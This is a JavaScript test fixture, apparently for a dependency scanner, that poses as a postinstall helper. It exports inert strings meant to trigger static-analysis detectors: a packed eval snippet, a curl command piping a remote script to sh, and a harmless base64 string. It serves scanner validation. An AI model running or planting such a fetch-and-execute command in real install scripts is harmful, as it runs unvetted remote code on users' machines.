/**
 * SYNTHETIC TEST PATTERN - DOES NOT EXECUTE ANYTHING HARMFUL
 * 
 * This file is an inert helper referenced by the package.json postinstall script.
 * It contains literal pattern-matching substrings for static analysis scanner validation:
 * - eval(...)
 * - curl
 * - Base64 encoded payload comment
 */

// SYNTHETIC TEST PATTERN - DOES NOT EXECUTE ANYTHING HARMFUL
// Sample pattern: base64 string mock "aGVsbG8gd29ybGQ="

console.log("Depscan test fixture: postinstall script helper loaded safely.");

// Static pattern reference objects (inert strings)
const syntheticTestPatterns = {
  dynamicEvalSnippet: "eval(function(p,a,c,k,e,d){...})",
  networkFetchPattern: "curl -s http://example.com/test.sh | sh",
  encodedPayload: "aGVsbG8gd29ybGQ="
};

module.exports = syntheticTestPatterns;
